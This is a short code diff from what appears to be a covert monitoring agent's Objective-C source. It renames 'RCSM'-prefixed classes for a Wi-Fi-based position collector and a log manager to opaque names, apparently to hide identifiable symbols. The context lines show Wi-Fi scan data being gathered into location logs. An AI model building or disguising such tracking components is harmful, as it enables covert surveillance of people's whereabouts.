@@ -24,7 +24,7 @@ typedef struct _WiFiInfo {
   UInt32 iRssi;                   // Received signal strength in _dBm_
 } WiFiInfo;
 
-static RCSMAgentPosition *sharedAgentPosition = nil;
+static __m_MAgentPosition *sharedAgentPosition = nil;
 
 extern BOOL ACInterfaceGetPower(SCNetworkInterfaceRef);
 extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
@@ -375,12 +375,12 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 
 @end
 
-@implementation RCSMAgentPosition
+@implementation __m_MAgentPosition
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSMAgentPosition *)sharedInstance
++ (__m_MAgentPosition *)sharedInstance
 {
   @synchronized(self)
   {
@@ -595,7 +595,7 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   agentAdditionalHeader->uType = LOGTYPE_LOCATION_WIFI;
   agentAdditionalHeader->uStructNum = [scan count];
   
-  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
+  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
   
   BOOL success = [logManager createLog: LOGTYPE_LOCATION_NEW
                            agentHeader: rawAdditionalHeader
